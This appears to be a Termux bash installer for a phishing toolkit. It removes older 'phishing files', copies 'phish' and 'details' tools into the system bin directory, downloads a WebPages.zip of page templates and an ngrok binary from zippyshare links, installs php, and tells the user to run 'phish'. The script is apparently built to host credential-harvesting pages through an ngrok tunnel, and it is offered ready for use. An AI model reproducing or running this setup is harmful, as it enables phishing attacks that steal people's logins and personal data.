#! /bin/bash
cd 
rm -rf ngrok
cd /data/data/com.termux/files/usr/bin
rm -rf phish
rm -rf details
echo "removing all old phishing files"
cd 
cd Phishing
cp -r details /data/data/com.termux/files/usr/bin
cp -r phish /data/data/com.termux/files/usr/bin
cd /data/data/com.termux/files/usr/bin
chmod 775 phish
chmod 775 details
cd
cd Phishing
chmod +x *
echo "installing files"
wget https://www76.zippyshare.com/d/jaY9zUe0/8627/WebPages.zip
unzip WebPages.zip
rm -rf WebPages.zip
cd
wget https://www118.zippyshare.com/d/zHuFz3zX/34018/ngrok
chmod +x *

pkg install gem -y
gem install lolcat
pkg install php



echo "run tool by writing - phish"
